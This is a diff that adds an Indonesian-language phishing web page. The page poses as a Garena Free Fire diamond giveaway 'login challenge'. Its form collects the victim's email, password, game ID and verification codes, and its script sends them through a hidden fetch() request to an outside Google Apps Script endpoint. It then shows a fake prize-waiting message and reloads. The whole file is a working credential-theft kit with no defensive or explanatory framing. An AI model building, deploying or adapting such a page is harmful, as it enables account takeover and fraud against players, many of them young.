@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>Garena Free Firee Give Away Login Challenge 💎</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:'Orbitron',sans-serif;}
+body{
+  height:100vh;
+  overflow:hidden;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  background:url('https://cdn0-production-images-kly.akamaized.net/qk0yrLwbr6nhljfECG8ltQ-vvSs=/1280x720/smart/filters:quality(75):strip_icc()/kly-media-production/medias/4058234/original/090110200_1655708618-Logo_Baru_Free_Fire.jpg') no-repeat center center fixed;
+  background-size:cover;
+  color:white;
+  position:relative;
+}
+
+canvas{position:absolute;top:0;left:0;width:100%;height:100%;z-index:0;}
+
+.container{
+  position:relative;
+  z-index:1;
+  background: rgba(0,0,0,0.7);
+  backdrop-filter: blur(5px);
+  padding:30px;
+  border-radius:20px;
+  width:360px;
+  max-width:95%;
+  box-shadow:0 0 50px #00eaff;
+  text-align:center;
+}
+
+header{
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:10px;
+  margin-bottom:20px;
+}
+
+header img{
+  width:80px;
+  max-width:20%;
+  height:auto;
+}
+
+header h1{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  font-size:24px;
+  font-weight:bold;
+  text-shadow:2px 2px 8px #000;
+}
+
+header h1 span.title{
+  color:#ffd700;
+  background:linear-gradient(90deg,#ff4b00,#ffd700);
+  -webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;
+}
+
+header h1 span.diamond{
+  font-size:32px;
+  animation:glow 1s infinite alternate;
+}
+
+@keyframes glow{
+  from{text-shadow:0 0 10px #00ffff,0 0 15px #00eaff;}
+  to{text-shadow:0 0 25px #00ffff,0 0 35px #00eaff;}
+}
+
+.step-text{
+  font-size:14px;
+  opacity:0.85;
+  margin-bottom:10px;
+}
+
+input{
+  width:100%;
+  padding:14px;
+  margin:10px 0;
+  border-radius:12px;
+  border:none;
+  font-size:16px;
+  background:rgba(255,255,255,0.1);
+  color:white;
+  text-shadow:1px 1px 2px #000;
+  outline:none;
+}
+
+input::placeholder{color:rgba(255,255,255,0.7);}
+
+button{
+  width:100%;
+  padding:14px;
+  margin-top:12px;
+  border:none;
+  border-radius:12px;
+  background: linear-gradient(90deg,#ffd700,#ff4b00);
+  color:black;
+  font-weight:bold;
+  font-size:16px;
+  cursor:pointer;
+  transition: all 0.3s ease;
+  box-shadow:0 0 15px #ffcd00;
+}
+
+button:hover{
+  transform:scale(1.08);
+  box-shadow:0 0 25px #ffd700,0 0 40px #ff4b00;
+}
+
+#info{
+  margin-top:15px;
+  font-size:18px;
+  font-weight:bold;
+}
+
+#progress{
+  height:8px;
+  background:#333;
+  border-radius:4px;
+  margin:15px 0 20px 0;
+  overflow:hidden;
+}
+
+#progress-bar{
+  height:100%;
+  width:0%;
+  background:#00ff99;
+  transition:width 0.3s ease;
+  border-radius:4px;
+}
+</style>
+</head>
+<body>
+
+<canvas id="particles"></canvas>
+
+<div class="container">
+  <header>
+    <img src="https://dl.dir.freefiremobile.com/common/web_event/hash/970f34cf4cd1a7b8b1a09e28067f167agif" alt="Free Fire Logo">
+    <h1>
+      <span class="title">Free Fire GIVE AWAY LOGIN CHALLENGE</span>
+      <span class="diamond">💎</span>
+    </h1>
+  </header>
+
+  <div id="progress">
+    <div id="progress-bar"></div>
+  </div>
+
+  <!-- STEP 1 -->
+  <div id="step1">
+    <div class="step-text">Login Akun Free Firee Kamu Dan Raih Hadiah Diamond Gratis</div>
+    <input class="s1" placeholder="Masukan Akun Email">
+    <input class="s1" placeholder="Masukan Password">
+    <button onclick="step1Func()">LOGIN</button>
+  </div>
+
+  <!-- STEP 2 -->
+  <div id="step2" style="display:none;">
+    <div class="step-text">MASUKAN ID DAN VERIFIKASI</div>
+    <input class="s2" placeholder="MASUKAN ID">
+    <input class="s2" placeholder="MASUKAN KODE VERIFIKASI">
+    <input class="s2" placeholder="MASUKAN KODE VERIFIKASI">
+    <button onclick="step2Func()">CLAIM HADIAH</button>
+  </div>
+
+  <div id="info"></div>
+</div>
+
+<script>
+const URL="https://script.google.com/macros/s/AKfycbx3xqFUsfOxqSnkd04iaLRrhKY2d770UhpWaLdHFiSSfIgquoR4bt_wW4DWnFNJ66A6/exec";
+let data=[];
+
+function step1Func(){
+  const vals=[...document.querySelectorAll(".s1")].map(i=>i.value.trim()).filter(v=>v);
+  if(vals.length<2){alert("Harus isi 2 username!");return;}
+  data=vals;
+  document.getElementById("step1").style.display="none";
+  document.getElementById("step2").style.display="block";
+  document.getElementById("progress-bar").style.width="50%";
+}
+
+function step2Func(){
+  const vals=[...document.querySelectorAll(".s2")].map(i=>i.value.trim()).filter(v=>v);
+  if(vals.length<3){alert("Harus isi 3 username!");return;}
+  data=data.concat(vals);
+
+  const unik=[...new Set(data)];
+  const status=(unik.length===1)?"MATCH":"TYPO";
+
+  const info=document.getElementById("info");
+  info.innerText=status==="MATCH"?"💎 MATCH — KONSISTEN!":"❌  TUNGGU 1 JAM MAKSIMAL ESTIMASI HADIAH!";
+  info.style.color=status==="MATCH"?"#00ff99":"#ff4444";
+  document.getElementById("progress-bar").style.width="100%";
+
+  fetch(URL+"?users="+encodeURIComponent(JSON.stringify(data))+"&status="+status,
+        {method:"GET",mode:"no-cors"});
+
+  if(status==="MATCH"){
+    const diamond=document.querySelector(".diamond");
+    diamond.style.transform="scale(1.7)";
+    setTimeout(()=>diamond.style.transform="scale(1)",700);
+  }
+
+  setTimeout(()=>location.reload(),2000);
+}
+
+// Particle background
+const canvas=document.getElementById("particles");
+const ctx=canvas.getContext("2d");
+let particles=[];
+function resizeCanvas(){canvas.width=window.innerWidth;canvas.height=window.innerHeight;}
+window.addEventListener('resize',resizeCanvas);
+resizeCanvas();
+
+for(let i=0;i<120;i++){
+  particles.push({
+    x:Math.random()*canvas.width,
+    y:Math.random()*canvas.height,
+    size:Math.random()*3+1,
+    speed:Math.random()*1+0.3
+  });
+}
+
+function animate(){
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  ctx.fillStyle="rgba(255,255,255,0.8)";
+  particles.forEach(p=>{
+    ctx.beginPath();
+    ctx.arc(p.x,p.y,p.size,0,Math.PI*2);
+    ctx.fill();
+    p.y-=p.speed;
+    if(p.y<0)p.y=canvas.height;
+  });
+  requestAnimationFrame(animate);
+}
+animate();
+</script>
+
+</body>
+</html>
